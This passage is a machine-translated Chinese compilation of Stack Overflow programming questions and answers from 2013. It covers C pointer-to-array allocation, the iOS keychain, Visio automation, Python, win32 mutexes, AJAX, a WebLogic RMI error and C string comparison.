我不明白声明`char (*dict0)[MAX_WORD_LEN+1];`

*   还给出了函数声明：
    **void createDict(struct dict* myDict);**

这是我写的，但我不确定它是否有效，而且我很难在编译器中检查它。我也是根据这个网站和其他网站的帖子写的，不太明白：

选项1：

```
void createDict(struct dict* myDict)
{

    myDict->(*dict0) =  malloc( (myDict->len)*sizeof(char*));
    myDict->(*dict1) = (char**) malloc( (myDict->len)*sizeof(char*));

    for(int i=0;i<(myDict->len);i++)
    {
        (myDict->(*dict0)[i]) = (char*)malloc((MAX_WORD_LEN+1)*sizeof(char));
        (myDict->(*dict0)[i]) = (char*)malloc((MAX_WORD_LEN+1)*sizeof(char));
    }
} 
```

选项 2：

```
(myDict->(*dict0)[MAX_WORD_LEN+1]) = malloc((myDict->len) * sizeof(char*));
(myDict->(*dict1)[MAX_WORD_LEN+1]) = malloc((myDict->len) * sizeof(char*)); 
```

请给我解释...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T15:41:01.170

首先需要了解以下三种声明的区别。为简洁起见，假设`N`是 MAX_WORD_LEN+1 以匹配您的尺寸：

```
char data[N];      // array of N chars
char *data[N];     // array of N char *pointers* (i.e. char *)
char (*data)[N];   // pointer to array of N chars 
```

最重要的是，指针是保存“地址”并且是实现定义的*变量。*就像`int`变量保存实现整数的值一样，指针变量保存实现地址。

在几乎所有情况下，您都可以`malloc()`使用 sizeof() 运算符正确存储指针类型，并取消引用底层目标。在某些情况下，这不直观或不易于呈现，但以下内容应该有所帮助：

```
// allocates sizeof(Type) block
Type *p = malloc(sizeof(*p));

// allocates N*sizeof(Type) contiguous blocks
//  note: we'll use this style later to answer your question
Type *pa = malloc(N * sizeof(*pa)); 
```

无论如何，这都会起作用`Type`。这很重要，因为在您的情况下，您有一个指针声明为：

```
char (*dict)[N]; 
```

正如我们上面已经讨论过的，这声明了一个类型的指针（pointer-to-N-chars）。请注意，*尚未分配实际内存。这只是一个指针；仅此而已*。因此，您可以使用上述语法安全地分配单个元素：

```
// allocate single block
char (*dict)[N] = malloc(sizeof(*dict)); 
```

但这仅占一个条目。您需要`len`条目，因此：

```
// allocate 'len' contiguous blocks each N chars in size
char (*dict)[N] = malloc(len * sizeof(*dict)); 
```

现在`dict`可以安全地从 0..(len-1) 作为数组寻址。您可以复制您的数据，例如：

```
strcpy(data[0], "test");
strcpy(data[1], "another test"); 
```

只要源字符串不超过 N 个字符（包括零终止符），这将正常工作。

最后，别忘了在完成后释放您的分配：

```
free(dict); 
```

* * *

**剧透**

```
myDict->dict0 =  malloc( myDict->len * sizeof(*(myDict->dict0)));
myDict->dict1 =  malloc( myDict->len * sizeof(*(myDict->dict1))); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:02:05.300

在结构的声明中，

```
char (*dict0)[MAX_WORD_LEN+1]; 
```

表示这`dict0`是**MAX_WORD_LEN + 1 个**元素`pointer`的字符数组，即.**`char [11]`**

 **要初始化对象的字段，您可以考虑如下所示的*示例*

```
void createDict(struct dict* myDict)
{
    myDict->dict0 = &glbarr;
    myDict->dict1 = &glbarr;
} 
```

哪里`glbarr`是一个全局数组定义为

```
char glbarr[MAX_WORD_LEN+1]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T15:04:33.073

`char (*dict)[MAX_WORD_LEN+1]`是一个指向数组的指针`char[MAX_WORD_LEN+1]`。或者您可以将其解释为此类数组的数组（二维数组）。

比方说 `typedef char MyString[MAX_WORD_LEN+1];`。

那么您的声明将如下所示`MyString *dict0;` 。换句话说，`dict0`可以是指向 . 数组的第一个元素的指针`MyString`。这就是你应该做的。

我不会发布详细的解决方案（您的老师不会对此感到满意）。

我还建议您感受 和 之间的`char (*dict)[10];`区别`char *dict[10];`。**

# javascript - SoundManager 2 一次多次播放相同的声音

> ID：15526645
> 
> 赞同：0
> 
> 时间：2013-03-20T14:40:06.937
> 
> 标签：javascript, html, soundmanager2

我正在制作游戏（俯视图，与英雄同行并做一些动作）。对图形使用 HTML5 画布，对游戏音频使用 SoundManager 2。

游戏世界中有很多物体，会发出声音，而音量取决于英雄的距离（如果发出声音的物体靠近英雄，声音会更大）。我这样做：

```
soundManager.play(soundId,{volume:vol}); 
```

所以，我知道，该音量参数是针对具有指定 soundId 的声音（如果我同时多次播放此声音，那么它将以相同的音量播放）。

我可以做些什么来让更多的物体同时使用一种声音，但音量不同吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-08T15:23:14.660

没有得到任何答案，所以我自己修复它，它对我有用（也许不是正确的方法）。

在将音频样本添加到 SoundManager 之前，我从游戏地图中收集信息，以获取所有使用声音样本的对象，然后为每个对象简单添加样本 - 具有不同 ID 的相同声音文件。

我添加了这个答案，因为也许有人觉得它有帮助。

# ios - 钥匙串找不到项目，但无法创建项目

> ID：15526646
> 
> 赞同：0
> 
> 时间：2013-03-20T14:40:11.113
> 
> 标签：ios, objective-c, keychain

我在 iOS 上的钥匙串确实有问题。

这里是`self.keychainItemQuery`：

```
{
    kSecClass = kSecClassGenericPassword;
    kSecAttrGeneric = "com.mycompany.player";
    kSecMatchLimit = kSecMatchLimitOne;
    kSecReturnAttributes = kCFBooleanTrue;
} 
```

当我做

```
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)self.keychainItemQuery, &attributes); 
```

我明白了

```
status == errSecItemNotFound 
```

好吧，这里是`self.keychainItemData`：

```
{
    kSecAttrAccount = "";
    kSecClass = kSecClassGenericPassword;
    kSecAttrDescription = "";
    kSecAttrGeneric = "com.mycompany.player";
    kSecAttrLabel = "";
    kSecValueData = <35663636 65623135 64303139 65363535>;
} 
```

但是当我这样做时

```
OSStatus result = SecItemAdd((__bridge CFDictionaryRef)dictionary, NULL); 
```

我明白了

```
result == errSecDuplicateItem 
```

我以为钥匙链物品被锁掉了`kSecAttrGeneric`。上面的查询在代码中的其他点找到钥匙串项。我觉得我错过了一些关于为什么这不起作用的细节。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:30:24.547

这篇[博文](http://useyourloaf.com/blog/2010/04/28/keychain-duplicate-item-when-adding-password.html)讨论了您的问题。

简而言之，您还需要为 keys`kSecAttrAccount`和`kSecAttrService`. `kSecClassGenericPassword`显然从这两个值确定钥匙串条目的唯一性。

您可以重复使用`kSecAttrGeneric`in的值`kSecAttrService`，但每个钥匙串条目都需要一个唯一`kSecAttrAccount`值。

更新您的示例，`self.keychainItemQuery`变为：

```
{
    kSecClass = kSecClassGenericPassword;
    kSecAttrGeneric = "com.mycompany.player";
    kSecAttrAccount = "account";               // This value should be unique for each entry you add
    kSecAttrService = "com.mycompany.player";
    kSecMatchLimit = kSecMatchLimitOne;
    kSecReturnAttributes = kCFBooleanTrue;
} 
```

并`self.keychainItemData`变成：

```
{
    kSecAttrAccount = "";
    kSecClass = kSecClassGenericPassword;
    kSecAttrDescription = "";
    kSecAttrGeneric = "com.mycompany.player";
    kSecAttrAccount = "account";               // This value should be unique for each entry you add
    kSecAttrService = "com.mycompany.player";
    kSecAttrLabel = "";
    kSecValueData = <35663636 65623135 64303139 65363535>;
} 
```

# vbscript - VBScript 自动化 Visio：如何将动态胶水移动到另一个形状？

> ID：15526649
> 
> 赞同：3
> 
> 时间：2013-03-20T14:40:17.273
> 
> 标签：vbscript, visio

我目前正在尝试使用 VBScripts 来自动化 Visio。

我有一个 visio 形状“开始”，现有连接“Verbindung”指向“BeginX”并定位到“PosX”（因此具有动态结束）。

我没有设法修改动态端，因此它被粘在“Stop”的形状上。:(

有没有办法移动现有的连接器以便成功连接形状？

![在此处输入图像描述](../Images/2631f9dbb3580659b5368c6d3b17366a.png)

```
Set startShape = CreateShape(visioApp,"ProzessSchablone.vss","Start",1,10)
Set stopShape = CreateShape(visioApp,"ProzessSchablone.vss","Stop",3,10)
Set startConnectedFrom = startShape.FromConnects.Item(1)    'to retrieve value: connect 
```

像这样的东西不起作用：

```
startConnectedFrom.Cells("BeginX").glueToPos stopShape,0.5,0.5 
```

我也尝试使用“PosX”而不是“BeginX”，但效果不佳。:(

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:47:50.483

您似乎没有从您检索的 Connect 对象中获取形状参考。那么这样的事情怎么样：

```
Set shpConn = shpStart.FromConnects(1).FromSheet
Dim vFromCellStop As Cell
Set vFromCellStop = shpConn.CellsU("EndX")    
vFromCellStop.GlueToPos shpStop, 0.5, 0.5 
```

如果您使用的是 Visio 2007，您可能会发现删除原始连接器并在 Shape 对象上使用[AutoConnect方法更简单。](http://msdn.microsoft.com/en-us/library/ff765915.aspx)如果您正在查看以前的版本，或者特别想处理哪些单元格粘合到哪个单元格，那么 Connects 和 FromConnects 会更好。

以下是这两种方法的几个 VBA 示例：

```
Sub AutoConnectExample()
Dim shpStart As Shape
Dim shpStop As Shape
Dim vPag As Page

    Set vPag = ThisDocument.Pages(1)

    Set shpStart = vPag.Drop(ThisDocument.Masters("Start"), 1, 3)
    Set shpStop = vPag.Drop(ThisDocument.Masters("Stop"), 3, 1)

    shpStart.AutoConnect shpStop, visAutoConnectDirNone

End Sub

Public Sub ConnectWithGlueExample()

Dim shpStart As Shape
Dim shpStop As Shape
Dim vPag As Page
Dim shpConn As Shape

    Set vPag = ThisDocument.Pages(1)

    Set shpStart = vPag.Drop(ThisDocument.Masters("Start"), 5, 7)
    Set shpStop = vPag.Drop(ThisDocument.Masters("Stop"), 7, 5)

    Set shpConn = vPag.Drop(Application.ConnectorToolDataObject, 1, 1)

    Dim vFromCellStart As Cell
    Dim vToCellStart As Cell
    Set vFromCellStart = shpConn.CellsU("BeginX")
    Set vToCellStart = shpStart.CellsSRC(visSectionObject, visRowXFormOut, 0)

    Dim vFromCellStop As Cell
    Dim vToCellStop As Cell
    Set vFromCellStop = shpConn.CellsU("EndX")
    Set vToCellStop = shpStop.CellsSRC(visSectionObject, visRowXFormOut, 0)

    vFromCellStart.GlueTo vToCellStart
    vFromCellStop.GlueTo vToCellStop

End Sub 
```

如果您运行这两个，您应该得到以下结果（注意 - 没有错误检查，并假设您从中调用代码的文档中存在母版）：

![Visio 形状连接](../Images/b25f2b545e1306d05e902a175bcb1e50.png)

# variables - 在程序中创建变量

> ID：15526658
> 
> 赞同：0
> 
> 时间：2013-03-20T14:40:40.050
> 
> 标签：variables, python-3.x

接下来，在我学习 Python 的过程中，我遇到了一个问题。可以在程序内部创建一个变量，通过连接字符串命名，并用于存储一个对象吗？

所以，我的对象：

```
class Veg:
    def __init__(self, x):
        self.name = x
        print('You have created a new vegetable:', self.name, end='\n') 
```

现在，要创建一个变量：

```
tag = 1
newVegObj = 'veg' + str(tag) #Should create a variable named 'veg1'
newVegObj = Veg('Pepper') #Creates an object stored in 'newVegObj' :( 
```

但我希望创建的对象存储在“veg1”中。然后我可以这样做：

```
tag = tag + 1
newVegObj = 'veg + str(tag) #Create a variable named 'veg2'
newVegObj = Veg('Tomato') 
```

目标是 veg1.name = Pepper 和 veg2.name = Tomato，并且能够不断创建额外的变量来存储额外的蔬菜。

我不知道这是否可能。如果是这样，并且如果这需要一个复杂的解决方案，您能否提供一个有用的代码解释？希望它是一些简单的事情，我只是没有考虑。

提前致谢！你们是最棒的！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:02:25.260

考虑到您的评论，以下内容可能会很有用。

```
names = ['Tomato', 'Snoskommer', 'Pepper'] # a list containing 3 names
vegetables = {} # an empty dictionary

for name in names: # just textual: for each name in the names list ...
    new_veg = Veg(name) # create a new vegetable with the name stored in the variable 'name'
    vegetables[name] = new_veg # add the new vegetable to the vegetable dictionary

# at this point, the vegetables dictionary will contain a number of vegetables, which you can find by
# 'indexing' the dictionary with their name:
print(vegetables['Tomato'].name) # will print 'Tomato' 
```

希望这有助于理解 Python 中的一些基础知识，尽管从一个简单的教程开始可能是最好的:)

* * *

为了扩展，可以在以后进行类似以下的更改：

def add_vegetable(name): if name in vegetables: print('已经有一个叫这个名字的蔬菜...') else: vegetables[name] = Veg(name)

调用函数将蔬菜添加到列表中：

```
add_vegetable('Cucumber') 
```

之后字典将包含另一种名为“黄瓜”的蔬菜。

但再说一遍：通过一些介绍性教程，[http](http://python.org) ://python.org应该能够为您指出一些。

# python - CSV vs XML 解析速度 Python

> ID：15526660
> 
> 赞同：1
> 
> 时间：2013-03-20T14:40:44.040
> 
> 标签：python, xml, django, csv

对于我正在从事的项目，我需要消化以 CSV 或 XML 格式提供的大型数据提要，并将数据导入 Django 模型。我应该为性能选择哪种格式？

# python - 等到在 Python (win32) 中创建互斥锁

> ID：15526665
> 
> 赞同：2
> 
> 时间：2013-03-20T14:40:53.630
> 
> 标签：python, winapi, mutex

我正在使用**win32event** Python 模块与在另一个程序中创建的 Mutex 交互（基于 C#）

我的代码打开一个互斥体，然后等待它：

```
hWait = win32event.OpenMutex(win32con.MUTEX_ALL_ACCESS, False, "mutexname")
win32event.WaitForSingleObject(hWait, 20000) 
```

这段代码的问题在于，如果尚未创建互斥锁，它会失败（例如，如果 python 程序在 C# 程序创建互斥锁之前尝试打开它）。

在创建互斥锁之前如何阻止？是否有任何允许这样做的 Python 或库方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-10-27T09:26:06.843

正如@manuell（在评论中）所指出的那样，简单的解决方案是循环直到创建互斥锁，静默捕获互斥锁尚不存在时引发的错误：

```
while True:

   try:
      hWait = win32event.OpenMutex(MUTEX_ALL_ACCESS, False, "mutexname")
   except pywintypes.error:
      pass
   else:
      break 
```

根据您的具体情况，您可能希望在循环内显式地休眠一点，将等待循环放在单独的线程中，或将其转换为生成器或协程，或使用它来触发运行 win32 事件另一个已经运行的线程中的某些东西（有关如何等待事件直到它发生，请参阅我的其他答案）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-27T08:09:15.577

请注意，当使用 时`win32event.WaitForSingleObject`，而不是指定一些任意但足够长的时间来等待（20000），也可以简单地使用`win32event.INFINITE`无限期地阻塞直到事件发生，如：

```
win32event.WaitForSingleObject(waitable, win32event.INFINITE) 
```

例如，当您需要告诉另一个线程中的代码互斥锁已打开时，这可能很有用。

由于如果尚未创建互斥锁，则等待互斥锁会失败，因此我们改为创建一个事件以在互斥锁打开时触发。

```
mutex_open = win32event.CreateEvent(None, 0, 0, None) 
```

然后启动一个等待事件的线程：

```
def wait_for_opening(open_evt):
   win32event.WaitForSingleObject(open_evt, win32event.INFINITE)
   print("Got notified that mutex is now open.")

waiter = threading.Thread(target=wait_for_opening, args=(mutex_open,))
waiter.start() 
```

要模拟另一个程序，请在一段时间后启动另一个创建互斥锁的线程：

```
def delayed_create():
   time.sleep(1)
   m = CreateMutex(None, True, u"mutexname")

creator = threading.Thread(target=delayed_create)
creator.start() 
```

最后，运行等待互斥锁打开的循环，然后设置事件。

```
while True:

   try:
      hWait = win32event.OpenMutex(MUTEX_ALL_ACCESS, False, "mutexname")
   except pywintypes.error:
      pass
   else:
      win32event.SetEvent(mutex_open)
      break 
```

注意`setEvent`通话。

因此，在运行代码时，一段时间后，`waiter`线程会收到通知说互斥锁现在已打开。

# ajax - AJAX：getElementById().innterHTML 不起作用

> ID：15526666
> 
> 赞同：0
> 
> 时间：2013-03-20T14:40:54.710
> 
> 标签：ajax, innerhtml

以下代码不起作用，我不知道为什么。即服务器文件中的文本未在屏幕上打印。因此，我要更改的文本不会更改。

设置的第一部分`ajaxRequest`适用于其他示例代码。

```
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>

</head>
<body>

<script type="text/javascript">

//Browser Support Code
function ajaxFunction()
{
var ajaxRequest;  

try{
    // Opera 8.0+, Firefox, Safari
    ajaxRequest = new XMLHttpRequest();
} catch (e){
    // Internet Explorer Browsers
    try{
        ajaxRequest = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
        try{
            ajaxRequest = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (e){
            // Something went wrong
            alert("Your browser broke!");
            return false;
        }
    }
} 
```

我很确定问题出在下面的某个地方，但我看不出在哪里：

```
ajaxRequest.onreadystatechange = function()
    {
    if(ajaxRequest.readyState == 4)
            {
                document.getElementById("time").innerHTML = ajaxRequest.responseText;
    }
}
ajaxRequest.open("POST", "serverTime.php", true);
ajaxRequest.send(null); 
}

</script>

<form name='myForm'>
    Name: <input type='text' onChange="ajaxFunction();" name='username' /> <br />
      <p id="time">Original text</p>
</form>

</body>
</html> 
```

以下是代码`serverTime.php`：

```
<?php

echo "Hello world."; 
?> 
```

当我在“用户名”输入中键入“test”时，浏览器看起来像这样：

```
http://localhost/ajax_testing/ajax_tut.html?username=test 
```

# rest - 在 glassfish 中的 ejb 3 上使用远程接口进行 RMI 调用

> ID：15526669
> 
> 赞同：1
> 
> 时间：2013-03-20T14:41:03.953
> 
> 标签：rest, glassfish, weblogic, ejb-3.1

当我尝试调用远程接口时，这段代码有一些问题，即部署在其他服务器（Weblogic）中。

这是我的客户：

```
package service;

import java.util.*;
import javax.ejb.*;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.ws.rs.*;
@Path("/")
@Stateless

public class GestionPersonnel {
  Context ctx;

   @GET
   @Produces("application/json")
   @Path("requete")
public  void test() throws NamingException{

       Hashtable<Object, Object> env = new Hashtable<Object, Object>();
        // WebLogic Server 10.x connection details
        env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");

        env.put(Context.PROVIDER_URL, "t3://127.0.0.1:7001");

        env.put(Context.SECURITY_PRINCIPAL, "dream");

        env.put(Context.SECURITY_CREDENTIALS, "dream123");

        Context ic =  new InitialContext(env);

        MetamodelService metamodelService = (MetamodelService) ic.lookup("MetamodelContentService#com.evision.metamodel.services.MetamodelService");
        Euser user = metamodelService.findEuserByUserName("aaaaa@tata.ca");

        System.out.println(user.getFirstName());

    };  

   @GET
   @Produces("application/json")
   @Path("requete2")
public  String test2() {

     return "hello";

 }
} 
```

当我试图在我的客户端中调用此函数时（MetamodelService metamodelService = (MetamodelService) ic.lookup("MetamodelContentService#com.metamodel.services.MetamodelService");）我有这个问题：

```
java.lang.ClassCastException
    at com.sun.corba.ee.impl.javax.rmi.PortableRemoteObject.narrow(PortableRemoteObject.java:262)
    at javax.rmi.PortableRemoteObject.narrow(PortableRemoteObject.java:153)
    at weblogic.ejb.container.internal.RemoteBusinessIntfProxy.readObject(RemoteBusinessIntfProxy.java:215)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:991)
    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1866)
    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1771)
    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1347)
    at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1964)
    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1888)
    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1771)
    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1347)
    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:369)
    at weblogic.utils.io.ChunkedObjectInputStream.readObject(ChunkedObjectInputStream.java:197)
    at weblogic.rjvm.MsgAbbrevInputStream.readObject(MsgAbbrevInputStream.java:564)
    at weblogic.utils.io.ChunkedObjectInputStream.readObject(ChunkedObjectInputStream.java:193)
    at weblogic.rmi.internal.ObjectIO.readObject(ObjectIO.java:62)
    at weblogic.rjvm.ResponseImpl.unmarshalReturn(ResponseImpl.java:240)
    at weblogic.rmi.cluster.ClusterableRemoteRef.invoke(ClusterableRemoteRef.java:348)
    at weblogic.rmi.cluster.ClusterableRemoteRef.invoke(ClusterableRemoteRef.java:259)
    at weblogic.jndi.internal.ServerNamingNode_1030_WLStub.lookup(Unknown Source)
    at weblogic.jndi.internal.WLContextImpl.lookup(WLContextImpl.java:392)
    at weblogic.jndi.internal.WLContextImpl.lookup(WLContextImpl.java:380)
    at javax.naming.InitialContext.lookup(InitialContext.java:411)
    at service.GestionPersonnel.test(GestionPersonnel.java:38)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60)
    at com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205)
    at com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75)
    at com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:288)
    at com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108)
    at com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147)
    at com.sun.jersey.server.impl.uri.rules.RootResourceClassesRule.accept(RootResourceClassesRule.java:84)
    at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1469)
    at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1400)
    at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1349)
    at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1339)
    at com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:416)
    at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:537)
    at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:708)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:770)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1542)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:849)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:746)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1045)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:228)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.ClassCastException: com.evision.metamodel.services.impl.MetamodelContentService_jkkjlc_MetamodelServiceImpl_1032_WLStub cannot be cast to org.omg.CORBA.Object
    at com.sun.corba.ee.impl.javax.rmi.PortableRemoteObject.narrow(PortableRemoteObject.java:245)
    ... 70 more 
```

感谢您的回复:)

# ruby-on-rails - 为什么人们有时会在非 Ruby 类中使 用实例变量？

> ID：15526672
> 
> 赞同：1
> 
> 时间：2013-03-20T14:41:07.713
> 
> 标签：ruby-on-rails, ruby, fog

例如，在[`Fog`gem](http://fog.io/dns/)的代码片段中，例如

```
require 'rubygems'
require 'fog'

# create a connection to the service
dns = Fog::DNS.new({
  :provider     => 'Zerigo',
  :zerigo_email => ZERIGO_EMAIL,
  :zerigo_token => ZERIGO_TOKEN
})

zone = @dns.zones.create(
  :domain => 'example.com',
  :email  => 'admin@example.com'
) 
```

为什么`dns`一开始不是实例变量，而是在下一段变成了实例变量？为什么`zone`不是实例变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:48:31.523

这通常发生在使用属性读取器/写入器时，如`attr_reader`, `attr_writer`, `attr_accessor`。这些宏创建一个实例变量，并分别为它公开一个“getter”方法、“setter”方法或两者。在实例方法中，实例变量总是可以访问的。

关于示例中使用的具体代码，它似乎`dns`是一个标准的局部变量。如果它实际上是一个属性访问器，它应该被写成：

```
self.dns = Fog::DNS.new({... 
```

因为属性访问器实际上是一个方法，而不是一个局部变量。因此，您可以正确地说它在被声明为局部变量后不能简单地“成为”实例变量，并且当前的示例代码是对现实世界使用的不准确表示。

# c++ - Char 数组和 if 语句语法

> ID：15526683
> 
> 赞同：0
> 
> 时间：2013-03-20T14:41:25.783
> 
> 标签：c++, c, optimization, arduino

我对 char 数组和 if 语句有疑问。

我试着做：

```
void Motors::manualMotion(int CycleDutyAzim,int CycleDutyPitch,char directionAzim[],char directionPitch[]){

    setCycleDutyA(CycleDutyAzim);
    setCycleDutyP(CycleDutyPitch);

    if(directionAzim=="FORW"){
        moveForwAzim();
    }else if(directionAzim=="BACK"){
        moveBackAzim();
    }else{
        Serial.println("FAIL");
        handbreakAzim();
    }

    if(directionPitch=="FORW"){
        moveForwPitch();
    }else if(directionPitch=="BACK"){
        moveBackPitch();
    }else{
        Serial.println("FAILED");
        handbreakPitch();
    }
} 
```

我总是得到带有消息的serial.prints。我让它在 char 而不是数组上工作。为了正常工作的语法是什么。当我调用该方法时，我给出了这个：

```
Motors::manualMotion(90,50,"FORW","BACK"); 
```

它不起作用。当我使用像 F 和 B 这样的一个字符时，它可以正常工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:43:55.937

```
if (directionPitch == "FORW") 
```

您不能用于`==`比较字符串。

当您将数组传递给函数时，它会衰减为指向其第一个元素的指针。当您`==`用于比较时，它只将指针的地址与字符串文字“FORW”的地址进行比较。这显然不是你想要做的。您想要的是将字符串文字与指针指向的内容进行比较。

如果您需要`strcmp`比较 c 风格的字符串，则需要。

另一方面，为什么要在 C++ 中使用`char []`而不是？`std::string`它为您节省了手动内存管理的所有问题，您可以简单地`==`用于字符串对象比较。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T14:44:27.327

因为您不能比较 C 风格的字符串，所以`==`应该使用[`strcmp`](http://en.cppreference.com/w/cpp/string/byte/strcmp).

然而*arduino*没有STLs，但是[有一个port](http://andybrown.me.uk/wk/2011/01/15/the-standard-template-library-stl-for-avr-with-c-streams/)，那么你就可以享受STLs了。另一种方法是使用[`std::string`](http://en.cppreference.com/w/cpp/string/basic_string)而不是 C 风格的字符串。

```
void Motors::manualMotion(int CycleDutyAzim,int CycleDutyPitch,
const std::string &directionAzim, const std::string &directionPitch) { // ... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:44:36.090

C/C++`char * ==`不会按照您的想法去做，`strcmp/stricmp/strncmp`而是使用等等。别担心，常见的错误，特别是如果您习惯于具有固有字符串类型的语言。

此外，您可能会考虑枚举类型而不是传递字符串。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:47:08.013

这不是你比较 C 风格字符串的方式，你应该使用`strcmp()`或类似的。当你这样做

```
directionAzim=="FORW" 
```

您正在比较*指针*。

```
char directionAzim[] 
```

在您的原型中也可以写成：

```
char *directionAzim 
```

并且`"FORW"`是 类型`const char *`。所以，如果你通过：

```
Motors::manualMotion(90,50,"FORW","BACK"); 
```

这是*不安全*的，因为没有什么可以阻止函数尝试更改文字（这可能会使您的程序崩溃）。你的原型应该是这样的：

```
void Motors::manualMotion(int CycleDutyAzim,int CycleDutyPitch,
   const char directionAzim[], const char directionPitch[]); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T14:47:58.140

您应该使用字符串比较。数组比较不以这种方式存在。C++ 不会仅仅因为`char`数组*通常*是一个以空字符结尾的字符串就进行以空字符结尾的字符串比较。`char[]`在这件事上不会得到任何特殊待遇`int[]`。

要么使用像[std::string](http://cplusplus.com/reference/string/string/)这样的字符串类，要么使用[strcmp](http://cplusplus.com/reference/cstring/strcmp/)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-20T14:46:54.473

`if (variable == value)`只能用来比较简单类型，一个字符，一个整数。字符数组不是简单的类型，因此您需要一个函数来进行比较。`strcmp`或者`stricmp`会为你工作。

# python - Python：避免指向同一元素的子列表

> ID：15526684
> 
> 赞同：1
> 
> 时间：2013-03-20T14:41:29.220
> 
> 标签：python, list, reference

